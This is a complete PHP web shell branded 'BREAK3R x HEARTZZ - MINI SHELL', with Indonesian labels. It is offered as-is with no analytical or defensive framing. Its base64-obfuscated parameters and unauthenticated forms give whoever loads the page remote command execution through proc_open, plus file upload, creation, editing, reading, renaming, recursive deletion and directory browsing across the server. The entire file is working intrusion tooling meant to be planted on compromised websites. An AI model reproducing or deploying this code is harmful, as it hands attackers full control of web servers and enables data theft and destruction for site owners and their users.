<!DOCTYPE html>
<html>
<head>
    <title>BREAK3R x HEARTZZ</title>
    <link href="https://fonts.googleapis.com/css?family=Arial%20Black" rel="stylesheet">
    <style>
    body {
        font: 9pt Lucida,Verdana;
        color: #df5;
        margin: 0;
        padding: 0;
        background-color: #242222c9;
    }
	
	a:link, a:visited {
  color: #df5;
font-weight: bold;
}

a:hover, a:active {
  color: #df5;
font-weight: bold;
}
	
    .result-box-container {
        position: relative;
        margin-top: 20px;
    }

    .result-box {
        width: 100%;
        height: 200px;
        padding: 10px;
        border: 1px solid #ddd;
        border-radius: 5px;
        background-color: #f4f4f4;
        overflow: auto;
        box-sizing: border-box;
        font: 9pt Lucida,Verdana;
        color: #333;
    }

    .result-box::placeholder {
        color: #999;
    }

    .result-box:focus {
        outline: none;
        border-color: #128616;
    }

    .result-box::-webkit-scrollbar {
        width: 8px;
    }

    .result-box::-webkit-scrollbar-thumb {
        background-color: #128616;
        border-radius: 4px;
    }
    .container {
        max-width: 80%;
        margin: 20px auto;
        padding: 20px;
        border-radius: 5px;
        box-shadow: 0 0 20px 10px rgba(0, 0, 0, 1);
    }
    .header {
        text-align: center;
        margin-bottom: 20px;
    }
    .header h1 {
        font-size: 24px;
    }
    .subheader {
        text-align: center;
        margin-bottom: 20px;
    }
    .subheader p {
        font-size: 16px;
        font-style: italic;
    }
    form {
        margin-bottom: 20px;
    }
    form input[type="text"],
    form textarea {
        width: 90%;
        padding: 8px;
        margin-bottom: 10px;
        border: 1px solid #ddd;
        border-radius: 3px;
        box-sizing: border-box;
    }
    form input[type="submit"] {
        padding: 10px;
        background-color: #128616;
        color: white;
        border: none;
        border-radius: 3px;
        cursor: pointer;
    }
    form input[type="submit"]:hover {
        background-color: #143015;
    }
    table {
        width: 100%;
        border-collapse: collapse;
        margin-top: 20px;
    }
    th, td {
        text-align: center;
    }
	
.align-bottom {
   vertical-align: bottom
}
	
    th {
        background-color: #5e5e5e;
		height: 30px;
    }
    tr:nth-child(even) {
        background-color: #9c9b9bce;
    }
    .item-name {
        max-width: 200px;
        overflow: hidden;
        text-overflow: ellipsis;
        white-space: nowrap;
		text-align: left;
    }
    .size, .date {
        width: 100px;
    }
    .permission {
        font-weight: bold;
        width: 50px;
        text-align: center;
    }
    .writable {
        color: #2cf30b;
    }
    .not-writable {
        color: #d60909;
    }
</style>
</head>
<body>
<div class="container">
<?php
$timezone = date_default_timezone_get();
date_default_timezone_set($timezone);
$rootDirectory = realpath($_SERVER['DOCUMENT_ROOT']);
$scriptDirectory = dirname(__FILE__);

function x($b) {
    return base64_encode($b);
}

function y($b) {
    return base64_decode($b);
}

foreach ($_GET as $c => $d) $_GET[$c] = y($d);

$currentDirectory = realpath(isset($_GET['d']) ? $_GET['d'] : $rootDirectory);
chdir($currentDirectory);

$viewCommandResult = '';

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    if (isset($_FILES['fileToUpload'])) {
        $target_file = $currentDirectory . '/' . basename($_FILES["fileToUpload"]["name"]);
        if (move_uploaded_file($_FILES["fileToUpload"]["tmp_name"], $target_file)) {
            echo "File " . htmlspecialchars(basename($_FILES["fileToUpload"]["name"])) . " Upload success";
        } else {
            echo "Sorry, there was an error uploading your file.";
        }
    } elseif (isset($_POST['folder_name']) && !empty($_POST['folder_name'])) {
        $newFolder = $currentDirectory . '/' . $_POST['folder_name'];
        if (!file_exists($newFolder)) {
            mkdir($newFolder);
            echo '<hr>Folder created successfully!';
        } else {
            echo '<hr>Error: Folder already exists!';
        }
    } elseif (isset($_POST['file_name']) && !empty($_POST['file_name'])) {
        $fileName = $_POST['file_name'];
        $newFile = $currentDirectory . '/' . $fileName;
        if (!file_exists($newFile)) {
            if (file_put_contents($newFile, $_POST['file_content']) !== false) {
                echo '<hr>File created successfully!';
            } else {
                echo '<hr>Error: Failed to create file!';
            }
        } else {
            if (file_put_contents($newFile, $_POST['file_content']) !== false) {
                echo '<hr>File edited successfully!';
            } else {
                echo '<hr>Error: Failed to edit file!';
            }
        }
    } elseif (isset($_POST['delete_file'])) {
        $fileToDelete = $currentDirectory . '/' . $_POST['delete_file'];
        if (file_exists($fileToDelete)) {
            if (is_dir($fileToDelete)) {
                if (deleteDirectory($fileToDelete)) {
                    echo '<hr>Folder deleted successfully!';
                } else {
                    echo '<hr>Error: Failed to delete folder!';
                }
            } else {
                if (unlink($fileToDelete)) {
                    echo '<hr>File deleted successfully!';
                } else {
                    echo '<hr>Error: Failed to delete file!';
                }
            }
        } else {
            echo '<hr>Error: File or directory not found!';
        }
    } elseif (isset($_POST['rename_item']) && isset($_POST['old_name']) && isset($_POST['new_name'])) {
        $oldName = $currentDirectory . '/' . $_POST['old_name'];
        $newName = $currentDirectory . '/' . $_POST['new_name'];
        if (file_exists($oldName)) {
            if (rename($oldName, $newName)) {
                echo '<hr>Item renamed successfully!';
            } else {
                echo '<hr>Error: Failed to rename item!';
            }
        } else {
            echo '<hr>Error: Item not found!';
        }
    } elseif (isset($_POST['cmd_input'])) {
        $command = $_POST['cmd_input'];
        $descriptorspec = [
            0 => ['pipe', 'r'],
            1 => ['pipe', 'w'],
            2 => ['pipe', 'w']
        ];
        $process = proc_open($command, $descriptorspec, $pipes);
        if (is_resource($process)) {
            $output = stream_get_contents($pipes[1]);
            $errors = stream_get_contents($pipes[2]);
            fclose($pipes[1]);
            fclose($pipes[2]);
            proc_close($process);
            if (!empty($errors)) {
                $viewCommandResult = '<hr><p>Result:</p><textarea class="result-box">' . htmlspecialchars($errors) . '</textarea>';
            } else {
                $viewCommandResult = '<hr><p>Result:</p><textarea class="result-box">' . htmlspecialchars($output) . '</textarea>';
            }
        } else {
            $viewCommandResult = '<hr><p>Error: Failed to execute command!</p>';
        }
    } elseif (isset($_POST['view_file'])) {
        $fileToView = $currentDirectory . '/' . $_POST['view_file'];
        if (file_exists($fileToView)) {
            $fileContent = file_get_contents($fileToView);
            $viewCommandResult = '<hr><p>Result: ' . $_POST['view_file'] . '</p><textarea class="result-box">' . htmlspecialchars($fileContent) . '</textarea>';
        } else {
            $viewCommandResult = '<hr><p>Error: File not found!</p>';
        }
    }
}

echo '<hr>';
echo '<span style="color:red"class="Bold">Attention:</span>';
echo '<a href="?d=' . x($scriptDirectory) . '"> <span style="color:#df5"class="Bold">| BREAK3R x HEARTZZ - MINI SHELL |</span></a>';
echo '<br>';
echo '<br>';
echo '<br>';
echo 'Informasi Server:<br>';
echo " | " . $timezone . " | ";
echo "" . date('Y-m-d H:i:s');
echo ' |<br><br>Current Dir: ';

$directories = explode(DIRECTORY_SEPARATOR, $currentDirectory);
$currentPath = '';
$homeLinkPrinted = false;
foreach ($directories as $index => $dir) {
    $currentPath .= DIRECTORY_SEPARATOR . $dir;
    if ($index == 0) {
        echo ' / <a href="?d=' . x($currentPath) . '">' . $dir . '</a>';
    } else {
        echo ' / <a href="?d=' . x($currentPath) . '">' . $dir . '</a>';
    }
}

echo '<a href="?d=' . x($scriptDirectory) . '"> / <span style="color: red;">[ HOME ]</span></a>';
echo '<br>';
echo '<hr><form method="post" action="?'.(isset($_SERVER['QUERY_STRING']) ? $_SERVER['QUERY_STRING'] : '').'">';
echo '<br>';
echo '<br>';


echo '<hr>';
echo 'BUAT FOLDER:';
echo '<hr>';
echo '<br>';
echo '<input type="text" name="folder_name" placeholder="">';
echo '<br>';
echo '<input type="submit" value=">>">';
echo '</form>';
echo '<br>';



echo '<hr>';
echo 'BUAT FILE:';
echo '<hr>';
echo '<br>';
echo '<form method="post" action="?'.(isset($_SERVER['QUERY_STRING']) ? $_SERVER['QUERY_STRING'] : '').'">';
echo '<input type="text" name="file_name" placeholder=" NAMA">';
echo '<textarea name="file_content" placeholder=" ISI "></textarea>';
echo '<br>';
echo '<input type="submit" value=">>">';
echo '</form>';
echo '<br>';



echo '<hr>';
echo 'UPLOAD FILE:';
echo '<form method="post" enctype="multipart/form-data">';
echo '<hr>';
echo '<br>';
echo '<input type="file" name="fileToUpload" id="fileToUpload" placeholder="">';
echo '<br>';
echo '<br>';
echo '<input type="submit" value=">>" name="submit">';
echo '</form>';
echo '<br>';



echo '<hr>';
echo 'TERMINAL:';
echo '<hr>';
echo '<form method="post" action="?'.(isset($_SERVER['QUERY_STRING']) ? $_SERVER['QUERY_STRING'] : '').'"><br><input type="text" name="cmd_input" placeholder=""><br><input type="submit" value=">>"></form>';
echo $viewCommandResult;
echo '<div>';
echo '</div>';
echo '<table border=1>';
echo '<br><tr><th><center>Item Name</th><th><center>Size</th><th><center>Date</th><th>Permissions</th><th><center>View  </th><th><center>Delete</th><th><center>Rename </th></tr></center></center></center>';
foreach (scandir($currentDirectory) as $v) {
    $u = realpath($v);
    $s = stat($u);
    $itemLink = is_dir($v) ? '?d=' . x($currentDirectory . '/' . $v) : '?'.('d='.x($currentDirectory).'&f='.x($v));
    $permission = substr(sprintf('%o', fileperms($u)), -4);
    $writable = is_writable($u);
    echo '<tr>
            <td class="item-name"><a href="'.$itemLink.'">'.$v.'</a></td>
            <td class="size">'.filesize($u).'</td>
            <td class="date" style="text-align: center;">'.date('Y-m-d H:i:s', filemtime($u)).'</td>
            <td class="permission '.($writable ? 'writable' : 'not-writable').'">'.$permission.'</td>
            <td><form method="post" action="?'.(isset($_SERVER['QUERY_STRING']) ? $_SERVER['QUERY_STRING'] : '').'"><input type="hidden" name="view_file" value="'.htmlspecialchars($v).'"><input type="submit" value=" View    "></form></td>
            <td><form method="post" action="?'.(isset($_SERVER['QUERY_STRING']) ? $_SERVER['QUERY_STRING'] : '').'"><input type="hidden" name="delete_file" value="'.htmlspecialchars($v).'"><input type="submit" value="Delete   "></form></td>
            <td><form method="post" action="?'.(isset($_SERVER['QUERY_STRING']) ? $_SERVER['QUERY_STRING'] : '').'"><input type="hidden" name="old_name" value="'.htmlspecialchars($v).'"><input type="text" name="new_name" placeholder=""><input type="submit" name="rename_item" value=">>"></form></td>
        </tr>';
}

echo '</table>';
function deleteDirectory($dir) {
    if (!file_exists($dir)) {
        return true;
    }
    if (!is_dir($dir)) {
        return unlink($dir);
    }
    foreach (scandir($dir) as $item) {
        if ($item == '.' || $item == '..') {
            continue;
        }
        if (!deleteDirectory($dir . DIRECTORY_SEPARATOR . $item)) {
            return false;
        }
    }
    return rmdir($dir);
}
?>
</div>
</body>
</html>